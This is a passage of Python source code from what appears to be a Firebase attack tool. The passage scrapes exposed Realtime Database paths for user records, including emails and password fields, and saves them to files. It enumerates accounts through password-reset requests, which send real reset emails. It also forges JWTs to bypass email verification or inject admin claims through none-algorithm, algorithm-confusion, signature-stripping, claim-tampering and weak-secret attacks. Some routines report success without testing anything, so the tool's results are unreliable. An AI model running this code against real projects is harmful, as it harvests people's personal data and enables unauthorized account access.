        # Enhanced paths list
        paths_to_check = [
            '.json',  # Root
            'users.json', 'user.json', 'profiles.json', 'accounts.json',
            'admin.json', 'config.json', 'settings.json', 'private.json',
            'data.json', 'content.json', 'items.json', 'records.json',
            'messages.json', 'chats.json', 'posts.json', 'comments.json',
            'test.json', 'dev.json', 'debug.json', 'temp.json'
        ]
        
        print(f"{Colors.CYAN}[*] Testing {len(db_urls_to_test)} database URLs with {len(paths_to_check)} paths each{Colors.ENDC}")
        
        for db_base_url in db_urls_to_test:
            print(f"\n{Colors.CYAN}[*] Testing database: {db_base_url}{Colors.ENDC}")
            
            for path in paths_to_check:
                if path.startswith('/'):
                    path = path[1:]
                
                full_url = db_base_url.rstrip('/') + '/' + path
                
                try:
                    print(f"{Colors.CYAN}[*] Checking: {path}{Colors.ENDC}", end=" ")
                    response = self._make_request('GET', full_url, timeout=8)
                    
                    if not response:
                        print(f"{Colors.FAIL}✗{Colors.ENDC}")
                        continue
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        if content and content.strip().lower() not in ['null', '{}', '[]'] and len(content.strip()) > 2:
                            try:
                                data = response.json()
                                
                                if data is None:
                                    print(f"{Colors.YELLOW}○{Colors.ENDC} (null)")
                                    continue
                                
                                data_size = len(str(data))
                                print(f"{Colors.GREEN}✓{Colors.ENDC} ({data_size} chars)")
                                
                                # Extract users from this data
                                current_timestamp = int(time.time())
                                extracted_users = self._analyze_and_extract_users(
                                    data, full_url, path, current_timestamp
                                )
                                
                                users.extend(extracted_users)
                                
                                if extracted_users:
                                    print(f"    {Colors.GREEN}[+] Extracted {len(extracted_users)} user records{Colors.ENDC}")
                                
                            except json.JSONDecodeError:
                                print(f"{Colors.WARNING}○{Colors.ENDC} (non-JSON)")
                    
                    elif response.status_code in [401, 403]:
                        print(f"{Colors.GREEN}🔒{Colors.ENDC} (secured)")
                    else:
                        print(f"{Colors.FAIL}✗{Colors.ENDC}")
                    
                except Exception:
                    print(f"{Colors.FAIL}✗{Colors.ENDC}")
                    continue
                
                time.sleep(0.1)  # Rate limiting
        
        return users

    def _analyze_and_extract_users(self, data: any, url: str, path: str, timestamp: int) -> List[Dict]:
        """Analyze database data and extract user information"""
        extracted_users = []
        
        if isinstance(data, dict):
            # Check if this looks like a users collection
            if any(self._looks_like_user_record(value) for value in data.values() if isinstance(value, dict)):
                for key, value in data.items():
                    if isinstance(value, dict) and self._looks_like_user_record(value):
                        user_info = self._extract_user_fields(value, key, url, path, timestamp)
                        extracted_users.append(user_info)
            
            # Check if this is a single user record
            elif self._looks_like_user_record(data):
                user_info = self._extract_user_fields(data, 'single_record', url, path, timestamp)
                extracted_users.append(user_info)
        
        elif isinstance(data, list):
            for i, item in enumerate(data):
                if isinstance(item, dict) and self._looks_like_user_record(item):
                    user_info = self._extract_user_fields(item, f"item_{i}", url, path, timestamp)
                    extracted_users.append(user_info)
        
        return extracted_users

    def _looks_like_user_record(self, record: Dict) -> bool:
        """Determine if a record looks like user data"""
        if not isinstance(record, dict):
            return False
        
        user_indicators = [
            'email', 'Email', 'mail', 'emailAddress',
            'username', 'userName', 'user_name',
            'name', 'Name', 'displayName', 'fullName',
            'uid', 'userId', 'user_id', 'localId',
            'password', 'passwordHash', 'hashedPassword',
            'role', 'permissions', 'admin'
        ]
        
        matches = sum(1 for field in user_indicators if field in record)
        return matches >= 2

    def _extract_user_fields(self, record: Dict, key: str, url: str, path: str, timestamp: int) -> Dict:
        """Extract and normalize user fields from a record"""
        user_info = {
            'extraction_source': 'database_extraction',
            'database_url': url,
            'database_path': path,
            'database_key': key,
            'timestamp': timestamp,
            'raw_data': record
        }
        
        # Field mapping
        field_mappings = {
            'email': ['email', 'Email', 'mail', 'emailAddress'],
            'username': ['username', 'userName', 'user_name'],
            'name': ['name', 'Name', 'displayName', 'fullName'],
            'user_id': ['uid', 'id', 'userId', 'user_id', 'localId'],
            'password': ['password', 'passwordHash', 'hashedPassword'],
            'role': ['role', 'Role', 'userRole', 'permissions', 'admin']
        }
        
        for normalized_field, possible_keys in field_mappings.items():
            for key_name in possible_keys:
                if key_name in record:
                    user_info[normalized_field] = record[key_name]
                    break
        
        # Save individual user file
        identifier = (user_info.get('user_id') or 
                    user_info.get('email') or 
                    user_info.get('username') or 
                    key)
        
        if identifier:
            normalized_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', str(identifier))[:50]
            filename = f"firebase_db_user_{normalized_id}_{timestamp}.json"
            try:
                with open(filename, 'w') as f:
                    json.dump(user_info, f, indent=2)
                print(f"      {Colors.GREEN}[✓] User data saved to {filename}{Colors.ENDC}")
            except IOError as e:
                print(f"      {Colors.FAIL}[!] Error saving {filename}: {e}{Colors.ENDC}")
        
        return user_info

    def _fetch_profile_from_open_databases(self, email: str) -> Optional[Dict]:
        """Attempt to fetch a user's profile from commonly exposed database paths using their email."""
        if not self.project_id:
            # print(f"{Colors.YELLOW}[i] Project ID not set, cannot reliably check databases for {email}.{Colors.ENDC}")
            return None

        db_base_urls = []
        if self.database_url: # If a specific DB URL is known (e.g. from config extraction)
            db_base_urls.append(self.database_url.rstrip('/') + '/')
        
        # Add common regional patterns based on project ID
        if self.project_id: # Ensure project_id is not None
            db_base_urls.extend([template.format(project_id=self.project_id) for template in self.RTDB_URL_TEMPLATES])
        db_base_urls = list(set(db_base_urls)) # Deduplicate

        common_collection_names = self.COMMON_FIRESTORE_COLLECTIONS # Re-using similar list for paths
        
        email_local_part = email.split('@')[0] if '@' in email else email
        normalized_email_for_key = re.sub(r'[.#$\[\]]', '_', email)

        for db_url_base in db_base_urls:
            for collection_name in common_collection_names: # Using the refined list
                # Try with email local part as key
                path_to_try_local = f"{db_url_base.rstrip('/')}/{collection_name}/{email_local_part}.json"
                # Try with normalized full email as key
                path_to_try_normalized = f"{db_url_base.rstrip('/')}/{collection_name}/{normalized_email_for_key}.json"

                for lookup_path in [path_to_try_local, path_to_try_normalized]:
                    try:
                        # print(f"{Colors.CYAN}[i] DB Check: Trying {lookup_path} for {email}{Colors.ENDC}")
                        response = self.session.get(lookup_path, timeout=3) # Short timeout for these checks
                        if response.status_code == 200:
                            content = response.text
                            if content and content.strip().lower() != 'null' and len(content.strip()) > 2:
                                try:
                                    profile_data = response.json()
                                    if isinstance(profile_data, dict): # Ensure it's a JSON object
                                        print(f"{Colors.GREEN}[✓] Found potential profile for {email} in open DB at {lookup_path}{Colors.ENDC}")
                                        return profile_data
                                except json.JSONDecodeError:
                                    # Not valid JSON, but still an exposure if content is meaningful
                                    print(f"{Colors.WARNING}[!] Non-JSON data found for {email} at {lookup_path}. Exposure, but cannot parse profile.{Colors.ENDC}")
                                    return {"exposed_data_path": lookup_path, "raw_content_snippet": content[:100]} 
                    except requests.exceptions.Timeout:
                        # print(f"{Colors.YELLOW}[!] Timeout checking DB path: {lookup_path}{Colors.ENDC}")
                        continue
                    except requests.exceptions.RequestException:
                        # print(f"{Colors.YELLOW}[!] Error checking DB path: {lookup_path}{Colors.ENDC}")
                        continue
        return None

    def _enumerate_common_emails(self, api_key: str, custom_emails: Optional[List[str]] = None, email_file_path: Optional[str] = None, single_email: Optional[str] = None) -> List[Dict]:
            """Enumerate email patterns to find existing users, with options for custom inputs."""
            print(f"\n{Colors.CYAN}[*] Enumerating Email Patterns...{Colors.ENDC}")
            
            users = [] # Initialize users list
            emails_to_check_set = set()
            
            if single_email:
                if "@" in single_email: # Basic validation
                    emails_to_check_set.add(single_email)
                    print(f"{Colors.CYAN}[*] Testing single email: {single_email}{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] Invalid single email provided: {single_email}. Skipping.{Colors.ENDC}")
                    return users 
            else:
                # Populate with default common emails using defined constants
                current_default_domains = list(self.DEFAULT_EMAIL_DOMAINS) # Make a copy to extend
                if self.project_id:
                    current_default_domains.append(f'{self.project_id}.com') # Project-specific domain
                
                for domain in current_default_domains:
                    for username in self.DEFAULT_EMAIL_USERNAMES:
                        emails_to_check_set.add(f"{username}@{domain}")
                
                if self.project_id: # Add specific project emails if project_id is known
                     project_specific_emails = [f"{uname}@{self.project_id}.com" for uname in ["admin", "support", "test"]]
                     emails_to_check_set.update(project_specific_emails)

                # Add custom_emails list if provided
                if custom_emails:
                    for email_item in custom_emails: # changed email to email_item to avoid conflict with outer scope 'email'
                        if "@" in email_item: # Basic validation
                            emails_to_check_set.add(email_item)
                        else:
                            print(f"{Colors.WARNING}[!] Invalid email in custom list: {email_item}{Colors.ENDC}")
                
                # Process email_file_path if provided
                if email_file_path:
                    try:
                        with open(email_file_path, 'r') as f:
                            count_before = len(emails_to_check_set)
                            for line in f:
                                email_from_file = line.strip()
                                if "@" in email_from_file: # Basic validation
                                    emails_to_check_set.add(email_from_file)
                                elif email_from_file: 
                                    print(f"{Colors.WARNING}[!] Invalid email in file '{email_file_path}': {email_from_file}{Colors.ENDC}")
                        print(f"{Colors.GREEN}[✓] Added {len(emails_to_check_set) - count_before} unique emails from: {email_file_path}{Colors.ENDC}")
                    except FileNotFoundError:
                        print(f"{Colors.FAIL}[!] Email file not found: {email_file_path}{Colors.ENDC}")
                    except IOError as e:
                        print(f"{Colors.FAIL}[!] Error reading email file '{email_file_path}': {e}{Colors.ENDC}")
                
                if not custom_emails and not email_file_path: # Only default
                     print(f"{Colors.CYAN}[*] Testing {len(emails_to_check_set)} default common email patterns...{Colors.ENDC}")
                else: # Some custom input was given along with defaults
                    print(f"{Colors.CYAN}[*] Testing a total of {len(emails_to_check_set)} unique emails (including defaults, custom list, and/or file).{Colors.ENDC}")

            final_emails_to_check = list(emails_to_check_set)
            
            if not final_emails_to_check:
                print(f"{Colors.WARNING}[!] No valid emails to enumerate.{Colors.ENDC}")
                return users
            
            reset_endpoint = self.IDENTITY_TOOLKIT_SEND_OOB_CODE_ENDPOINT_TEMPLATE.format(api_key=api_key)
            
            for email in final_emails_to_check:
                try:
                    reset_data = {
                        "requestType": "PASSWORD_RESET",
                        "email": email
                    }
                    
                    response = self.session.post(reset_endpoint, json=reset_data, timeout=5)
                    
                    user_save_data = None # Changed from user_entry to user_save_data for clarity
                    current_timestamp = int(time.time())
                    normalized_email_filename = re.sub(r'[^a-zA-Z0-9]', '_', email)
                    filename_base = f"firebase_enum_user_{normalized_email_filename}_{current_timestamp}.json"
                    auth_check_status = "unknown"
                    print_msg = ""

                    if response.status_code == 200:
                        auth_check_status = "exists_reset_sent"
                        print_msg = f"{Colors.GREEN}[+] Found via auth: {email} (reset sent)."
                        
                    elif response.status_code == 400:
                        error_data = response.json()
                        error_msg = error_data.get('error', {}).get('message', '')
                        
                        if 'EMAIL_NOT_FOUND' in error_msg:
                            continue # Email does not exist, skip to next
                        elif 'RESET_PASSWORD_EXCEED_LIMIT' in error_msg:
                            auth_check_status = "exists_rate_limited"
                            print_msg = f"{Colors.GREEN}[+] Found via auth: {email} (rate limited)."
                        elif 'TOO_MANY_ATTEMPTS_TRY_LATER' in error_msg:
                            print(f"{Colors.WARNING}[!] Rate limited for {email} during auth check, pausing...{Colors.ENDC}")
                            time.sleep(5) 
                            continue 
                        else: 
                            print(f"{Colors.YELLOW}[?] Unknown 400 error for {email} during auth check: {error_msg}{Colors.ENDC}")
                            continue
                    else: # Other HTTP status codes for auth check
                        print(f"{Colors.YELLOW}[?] Unexpected status {response.status_code} for {email} during auth check.{Colors.ENDC}")
                        continue 
                    
                    # If email existence is confirmed by any of the above positive statuses
                    user_save_data = {
                        'email': email,
                        'project_id': self.project_id if self.project_id else "N/A",
                        'api_key_used': self.api_key[:10] + "..." if self.api_key else "N/A",
                        'timestamp': current_timestamp,
                        'existence_confirmed_by': "email_enumeration_password_reset",
                        'auth_check_status': auth_check_status,
                        'database_profile': None # Initialize
                    }
                    
                    # Attempt to fetch profile from open databases
                    database_profile = self._fetch_profile_from_open_databases(email)
                    if database_profile:
                        user_save_data["database_profile"] = database_profile
                        print_msg += f" {Colors.GREEN}Additional profile data found in open DB!{Colors.ENDC}"
                    else:
                        print_msg += f" {Colors.YELLOW}No additional profile data in open DB.{Colors.ENDC}"
                    
                    print(print_msg + f" Data saved to {filename_base}")
                    
                    users.append(user_save_data)
                    try:
                        with open(filename_base, 'w') as f_out:
                            json.dump(user_save_data, f_out, indent=2)
                    except IOError as e:
                        print(f"{Colors.FAIL}[!] Error saving data for {email} to {filename_base}: {e}{Colors.ENDC}")
                            
                except requests.exceptions.RequestException as e:
                    print(f"{Colors.FAIL}[!] Request error for {email}: {e}{Colors.ENDC}")
                    continue 
                    
                # Small delay to avoid aggressive rate limiting
                time.sleep(0.3)
            
            return users

    def _display_jwt_attack_summary(self, successful_attacks: List[Dict], original_token: str, analysis: Dict) -> None:
        """Display summary of JWT attacks"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           JWT ATTACK SUMMARY             ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not successful_attacks:
            print(f"\n{Colors.GREEN}[✓] No JWT vulnerabilities found - Token appears secure{Colors.ENDC}")
            return
        
        print(f"\n{Colors.FAIL}🚨 JWT VULNERABILITIES FOUND! 🚨{Colors.ENDC}")
        print(f"Successful attacks: {len(successful_attacks)}")
        
        for attack in successful_attacks:
            print(f"\n{Colors.FAIL}[+] {attack['attack']}{Colors.ENDC}")
            print(f"    Details: {attack['result'].get('details', 'No details')}")
            
            if attack['result'].get('manipulated_token'):
                token_preview = attack['result']['manipulated_token'][:50] + '...'
                print(f"    Token: {token_preview}")
        
        # Save JWT attack results
        timestamp = int(time.time())
        results_file = f"jwt_attacks_{timestamp}.json"
        
        results_data = {
            'timestamp': timestamp,
            'original_token_analysis': analysis,
            'successful_attacks': successful_attacks,
            'total_attacks_tested': len(successful_attacks) + 5,  # Approximate, adjust as needed
            'recommendations': [
                'Use RS256 algorithm with proper key management.',
                'Implement proper signature verification on the server-side.',
                'Validate all JWT claims server-side, especially `iss`, `aud`, and `exp`.',
                'Use short token lifetimes and implement refresh token rotation.',
                'Implement token blacklisting for compromised tokens.'
            ]
        }
        
        with open(results_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        print(f"\n{Colors.GREEN}[✓] JWT attack results saved to: {results_file}{Colors.ENDC}")
        # Removed call to self._generate_jwt_exploit_script(successful_attacks, analysis)

    def _test_manipulated_token(self, token: str, api_key: str) -> None:
        """Test what can be done with manipulated token"""
        print(f"\n{Colors.CYAN}[*] Testing Manipulated Token Capabilities{Colors.ENDC}")
        
        lookup_endpoint = self.IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
        response = self._make_request('POST', lookup_endpoint, json={"idToken": token}, timeout=5)
            
        if response and response.status_code == 200:
            try:
                user_data = response.json()
                users = user_data.get('users', [])
                
                if users:
                    user = users[0]
                    print(f"{Colors.GREEN}[+] Token accepted! User profile accessible:{Colors.ENDC}")
                    print(f"    Email: {user.get('email', 'Unknown')}")
                    print(f"    Email Verified: {user.get('emailVerified', False)}")
                    print(f"    User ID: {user.get('localId', 'Unknown')}")
                    
                    if user.get('emailVerified'):
                        print(f"{Colors.FAIL}🚨 EMAIL VERIFICATION BYPASS SUCCESSFUL! 🚨{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error testing token: {e}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[-] Token rejected: {response.status_code if response else 'No response'}{Colors.ENDC}")

    def _quick_token_test(self, token: str, api_key: str) -> bool:
        """Quick test to see if manipulated token is accepted"""
        try:
            lookup_endpoint = self.IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE.format(api_key=api_key) # Use constant
            
            response = self.session.post(
                lookup_endpoint,
                json={"idToken": token},
                timeout=5
            )
            
            return response.status_code == 200
            
        except Exception as e:
            return False

    def _get_firebase_public_key(self, key_id: str) -> Optional[str]:
        """Attempt to retrieve Firebase public key using _make_request."""
        response = self._make_request('GET', self.SECURETOKEN_API_URL, timeout=10)
        
        if response and response.status_code == 200:
            try:
                keys = response.json()
                return keys.get(key_id)
            except json.JSONDecodeError:
                print(f"{Colors.FAIL}[!] Failed to decode JSON from public key response: {response.text[:100]}{Colors.ENDC}")
        elif response:
            print(f"{Colors.FAIL}[!] Error fetching public keys: {response.status_code} - {response.text[:100]}{Colors.ENDC}")
        # If response is None, _make_request already printed the error.
        return None

    def _test_weak_secret_bruteforce(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test weak secret bruteforce for HMAC tokens"""
        if not analysis['algorithm'].startswith('HS'):
            return {'success': False, 'error': 'Not an HMAC token'}
        
        try:
            # Common weak secrets to try
            weak_secrets = [
                'secret', 'password', '123456', 'firebase', 'key',
                self.project_id, f'{self.project_id}_secret', 
                'firebase_secret', 'jwt_secret', 'your_secret_key',
                '', 'null', 'undefined', 'secret123', 'password123',
                analysis.get('key_id', ''), analysis.get('issuer', '').split('/')[-1]
            ]
            
            # Get the signing input
            header_payload = f"{analysis['raw_parts'][0]}.{analysis['raw_parts'][1]}"
            original_signature = base64.urlsafe_b64decode(
                analysis['raw_parts'][2] + '=' * (4 - len(analysis['raw_parts'][2]) % 4)
            )
            
            # Try each weak secret
            for secret in weak_secrets:
                try:
                    if analysis['algorithm'] == 'HS256':
                        calculated_sig = hmac.new(
                            secret.encode(),
                            header_payload.encode(),
                            hashlib.sha256
                        ).digest()
                    elif analysis['algorithm'] == 'HS512':
                        calculated_sig = hmac.new(
                            secret.encode(),
                            header_payload.encode(),
                            hashlib.sha512
                        ).digest()
                    else:
                        continue
                    
                    if calculated_sig == original_signature:
                        # Found the secret! Now create manipulated token
                        modified_payload = analysis['payload'].copy()
                        modified_payload['email_verified'] = True
                        
                        payload_encoded = base64.urlsafe_b64encode(
                            json.dumps(modified_payload, separators=(',', ':')).encode()
                        ).decode().rstrip('=')
                        
                        new_message = f"{analysis['raw_parts'][0]}.{payload_encoded}"
                        new_signature = hmac.new(
                            secret.encode(),
                            new_message.encode(),
                            hashlib.sha256 if analysis['algorithm'] == 'HS256' else hashlib.sha512
                        ).digest()
                        
                        new_signature_encoded = base64.urlsafe_b64encode(new_signature).decode().rstrip('=')
                        manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{new_signature_encoded}"
                        
                        return {
                            'success': True,
                            'details': f'Weak secret found: "{secret}"',
                            'manipulated_token': manipulated_token,
                            'secret': secret,
                            'algorithm': analysis['algorithm']
                        }
                        
                except Exception as e:
                    continue
            
            return {'success': False, 'error': 'No weak secrets found'}
            
        except Exception as e:
            return {'success': False, 'error': f'Weak secret bruteforce failed: {e}'}

    def _test_direct_payload_modification(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test direct payload modification without signature verification"""
        try:
            # Create various payload modifications
            modifications = [
                # Basic email verification bypass
                {'email_verified': True},
                
                # Admin role injection
                {'email_verified': True, 'admin': True, 'role': 'admin'},
                
                # Custom claims injection
                {'email_verified': True, 'custom_claims': {'admin': True, 'verified': True}},
                
                # Firebase-specific claims
                {'email_verified': True, 'firebase': {'sign_in_provider': 'google.com'}},
                
                # Authority escalation
                {'email_verified': True, 'iss': f'https://securetoken.google.com/{self.project_id}', 'admin': True},
            ]
            
            successful_modifications = []
            
            for mod in modifications:
                try:
                    modified_payload = analysis['payload'].copy()
                    modified_payload.update(mod)
                    
                    payload_encoded = base64.urlsafe_b64encode(
                        json.dumps(modified_payload, separators=(',', ':')).encode()
                    ).decode().rstrip('=')
                    
                    # Try with original signature
                    manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{analysis['raw_parts'][2]}"
                    
                    # Quick test
                    if self._quick_token_test(manipulated_token, api_key):
                        successful_modifications.append({
                            'modification': mod,
                            'token': manipulated_token
                        })
                        
                except Exception as e:
                    continue
            
            if successful_modifications:
                return {
                    'success': True,
                    'details': f'Payload modification successful: {len(successful_modifications)} variants work',
                    'modifications': successful_modifications,
                    'manipulated_token': successful_modifications[0]['token']
                }
            else:
                return {'success': False, 'error': 'Payload modification did not work'}
                
        except Exception as e:
            return {'success': False, 'error': f'Payload modification failed: {e}'}

    def _test_claims_manipulation(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test direct claims manipulation with original signature"""
        try:
            # Create multiple variations of manipulated claims
            manipulations = [
                {'email_verified': True},
                {'email_verified': True, 'admin': True},
                {'email_verified': True, 'role': 'admin'},
                {'verified': True, 'email_verified': True},
                {'email_verified': 'true'},  # String instead of boolean
                {'email_verified': 1},       # Number instead of boolean
            ]
            
            for manipulation in manipulations:
                modified_payload = analysis['payload'].copy()
                modified_payload.update(manipulation)
                
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(modified_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                # Keep original header and signature
                manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{analysis['raw_parts'][2]}"
                
                # Test this token quickly
                test_result = self._quick_token_test(manipulated_token, api_key)
                if test_result:
                    return {
                        'success': True,
                        'details': f'Claims manipulation successful: {manipulation}',
                        'manipulated_token': manipulated_token,
                        'manipulation': manipulation
                    }
            
            return {'success': False, 'error': 'No claims manipulation succeeded'}
            
        except Exception as e:
            return {'success': False, 'error': f'Claims manipulation failed: {e}'}

    def _test_signature_stripping(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test signature stripping attack"""
        try:
            # Try removing signature entirely
            parts = analysis['raw_parts']
            
            # Test 1: Empty signature
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # Try with empty signature
            manipulated_token = f"{parts[0]}.{payload_encoded}."
            
            return {
                'success': True,
                'details': 'Signature stripping - Empty signature',
                'manipulated_token': manipulated_token,
                'attack_type': 'signature_stripping'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'Signature stripping failed: {e}'}

    def _test_none_algorithm(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test 'none' algorithm attack"""
        try:
            # Modify header to use 'none' algorithm
            modified_header = analysis['header'].copy()
            modified_header['alg'] = 'none'
            
            # Modify payload to set email_verified = true
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            # Encode modified parts
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # No signature for 'none' algorithm
            manipulated_token = f"{header_encoded}.{payload_encoded}."
            
            return {
                'success': True,
                'details': "Algorithm 'none' attack - No signature verification",
                'manipulated_token': manipulated_token,
                'attack_type': 'none_algorithm'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'None algorithm attack failed: {e}'}

    def _test_algorithm_confusion(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test algorithm confusion attacks (RS256 -> HS256)"""
        if analysis['algorithm'] != 'RS256':
            return {'success': False, 'error': 'Token not using RS256'}
        
        try:
            # Try to get Firebase's public key and use it as HMAC secret
            public_key = self._get_firebase_public_key(analysis.get('key_id'))
            if not public_key:
                return {'success': False, 'error': 'Could not retrieve public key'}
            
            # Modify header to use HS256
            modified_header = analysis['header'].copy()
            modified_header['alg'] = 'HS256'
            
            # Modify payload to set email_verified = true
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            # Encode modified parts
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # Create signature using public key as HMAC secret
            message = f"{header_encoded}.{payload_encoded}"
            signature = hmac.new(
                public_key.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            # Create manipulated token
            manipulated_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
            
            return {
                'success': True,
                'details': 'Algorithm confusion attack - RS256 -> HS256',
                'manipulated_token': manipulated_token,
                'original_algorithm': 'RS256',
                'new_algorithm': 'HS256'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'Algorithm confusion failed: {e}'}

    def _display_jwt_analysis(self, analysis: Dict) -> None:
        """Display JWT analysis results"""
        if 'error' in analysis:
            print(f"{Colors.FAIL}[!] JWT Analysis Error: {analysis['error']}{Colors.ENDC}")
            return
        
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║              JWT ANALYSIS                ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}Header:{Colors.ENDC}")
        for key, value in analysis['header'].items():
            print(f"  {key}: {value}")
        
        print(f"\n{Colors.YELLOW}Key Claims:{Colors.ENDC}")
        key_claims = ['email', 'email_verified', 'user_id', 'iss', 'aud', 'sub']
        for claim in key_claims:
            if claim in analysis:
                color = Colors.FAIL if claim == 'email_verified' and not analysis[claim] else Colors.WHITE
                print(f"  {color}{claim}: {analysis[claim]}{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}Timing:{Colors.ENDC}")
        import datetime
        for time_claim in ['issued_at', 'expires_at', 'auth_time']:
            if analysis.get(time_claim):
                timestamp = analysis[time_claim]
                readable_time = datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                print(f"  {time_claim}: {timestamp} ({readable_time})")
        
        print(f"\n{Colors.YELLOW}Security Analysis:{Colors.ENDC}")
        print(f"  Algorithm: {analysis['algorithm']}")
        print(f"  Key ID: {analysis['key_id']}")
        print(f"  Signature Length: {len(analysis['signature'])} chars")
        
        # Identify potential weaknesses
        weaknesses = []
        if analysis['algorithm'] == 'none':
            weaknesses.append("Algorithm 'none' - No signature verification!")
        if analysis['algorithm'].startswith('HS'):
            weaknesses.append("HMAC algorithm - Vulnerable to key confusion attacks")
        if not analysis['email_verified']:
            weaknesses.append("Email not verified - Primary target for manipulation")
        if analysis.get('expires_at', 0) - analysis.get('issued_at', 0) > 86400:
            weaknesses.append("Long token lifetime - Extended attack window")
        
        if weaknesses:
            print(f"\n{Colors.FAIL}Potential Weaknesses:{Colors.ENDC}")
            for weakness in weaknesses:
                print(f"  • {weakness}")

    def _analyze_jwt(self, token: str) -> Dict:
        """Analyze JWT structure and extract information"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {'error': 'Invalid JWT format'}
            
            # Decode header
            header_padding = '=' * (4 - len(parts[0]) % 4)
            header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
            header = json.loads(header_data)
            
            # Decode payload
            payload_padding = '=' * (4 - len(parts[1]) % 4)
            payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
            payload = json.loads(payload_data)
            
            # Signature (raw)
            signature = parts[2]
            
            return {
                'header': header,
                'payload': payload,
                'signature': signature,
                'raw_parts': parts,
                'algorithm': header.get('alg', 'Unknown'),
                'key_id': header.get('kid', 'Unknown'),
                'issuer': payload.get('iss', 'Unknown'),
                'audience': payload.get('aud', 'Unknown'),
                'subject': payload.get('sub', 'Unknown'),
                'email': payload.get('email', 'Unknown'),
                'email_verified': payload.get('email_verified', False),
                'user_id': payload.get('user_id', 'Unknown'),
                'issued_at': payload.get('iat', 0),
                'expires_at': payload.get('exp', 0),
                'auth_time': payload.get('auth_time', 0)
            }
            
        except Exception as e:
            return {'error': f'JWT analysis failed: {e}'}

    def _test_jwt_manipulation_bypass(self, api_key: str) -> None: # New simplified version
        """Comprehensive test for JWT manipulation, using existing or new user token."""
        print(f"\n{Colors.CYAN}[*] Comprehensive JWT Manipulation Testing{Colors.ENDC}")

        print("1. Test with an existing user's ID Token")
        print("2. Create a new user and use their ID Token for testing")
        choice = input(f"{Colors.BOLD}[+] Select option (1-2): {Colors.ENDC}").strip()

        user_email, id_token = None, None
        if choice == "1":
            id_token = input(f"{Colors.BOLD}[+] Enter existing user's ID Token: {Colors.ENDC}").strip()
            user_email_input = input(f"{Colors.BOLD}[+] Enter corresponding user's email (optional, for context): {Colors.ENDC}").strip()
            user_email = user_email_input if user_email_input else "jwt_test_existing@example.com"
            if not id_token:
                print(f"{Colors.FAIL}[!] ID Token is required for existing user testing.{Colors.ENDC}")
                return
        elif choice == "2":
            # New user creation handled by _test_jwt_manipulation_bypass_existing
            pass
        else:
            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")
            return
        
        self._test_jwt_manipulation_bypass_existing(api_key, user_email, id_token)

    def _perform_jwt_tests(self, original_token: str, api_key: str, email: str) -> List[Dict]:
        """Helper function to perform various JWT attack tests."""
        successful_attacks = []
        jwt_analysis = self._analyze_jwt(original_token) # Assumes _analyze_jwt exists
        if 'error' in jwt_analysis:
            print(f"{Colors.FAIL}[!] Could not analyze JWT: {jwt_analysis['error']}{Colors.ENDC}")
            return successful_attacks
        
        self._display_jwt_analysis(jwt_analysis) # Assumes _display_jwt_analysis exists

        # Define JWT attack functions (these are assumed to exist or be added)
        # For this integration, we are focusing on the structure.
        jwt_attack_map = [
            ("Algorithm Confusion (RS256->HS256)", lambda t, a, k, e: self._test_algorithm_confusion(t, a, k, e)),
            ("None Algorithm Attack", lambda t, a, k, e: self._test_none_algorithm(t, a, k, e)),
            ("Signature Stripping", lambda t, a, k, e: self._test_signature_stripping(t, a, k, e)),
            ("Claims Manipulation (Direct Payload)", lambda t, a, k, e: self._test_claims_manipulation(t, a, k, e)),
            ("Weak Secret Bruteforce (if HMAC)", lambda t, a, k, e: self._test_weak_secret_bruteforce(t, a, k, e)),
            # Add other relevant JWT attacks from the original _test_jwt_manipulation_bypass method
